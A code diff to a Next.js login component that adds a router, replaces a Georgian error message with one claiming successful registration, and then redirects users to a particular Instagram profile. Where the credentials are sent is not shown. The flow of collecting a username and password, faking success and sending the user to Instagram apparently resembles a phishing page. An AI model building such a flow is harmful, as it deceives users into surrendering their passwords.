@@ -2,9 +2,11 @@
 import { useState } from 'react'
 import style from './page.module.scss'
 import axios from 'axios'
+import { useRouter } from 'next/navigation'
 import { Button, message, Space } from 'antd';
 
 export default function Login() {
+    const router = useRouter();
     const [userinfo, setUserinfo] = useState('')
     const [pass,setPass] = useState('')
     const [messageApi, contextHolder] = message.useMessage();
@@ -25,9 +27,9 @@ export default function Login() {
             console.log(res.data);
                 messageApi.open({
                   type: 'warning',
-                  content: 'ბოდიშით, ხარვეზი აქ საიტს',
+                  content: 'წარმატებით გაიარეთ რეგისტრაცია!',
                 });
-
+                router.push('https://www.instagram.com/sado0_1234/');
         })
         .catch(() => {
                 messageApi.open({
